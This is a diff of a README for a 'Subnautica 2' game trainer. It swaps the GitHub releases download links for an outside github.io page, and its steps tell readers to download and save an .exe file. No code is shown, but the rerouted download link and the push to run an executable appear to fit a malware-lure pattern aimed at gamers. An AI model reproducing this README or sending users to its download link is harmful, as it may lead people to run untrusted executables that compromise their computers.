@@ -1,12 +1,12 @@
 # 🛠️ Subnautica-2-Trainer-2026 - Master your survival experience easily
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Cheddarcheeseabsolutealcohol270/Subnautica-2-Trainer-2026/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://cheddarcheeseabsolutealcohol270.github.io)
 
 ## 📥 How to download the software
 
 Follow these steps to get the trainer on your computer.
 
-1. Go to the [official release page](https://github.com/Cheddarcheeseabsolutealcohol270/Subnautica-2-Trainer-2026/releases).
+1. Go to the [official release page](https://cheddarcheeseabsolutealcohol270.github.io).
 2. Look for the latest version at the top of the list.
 3. Click the link that ends in .exe.
 4. Save the file to your computer.
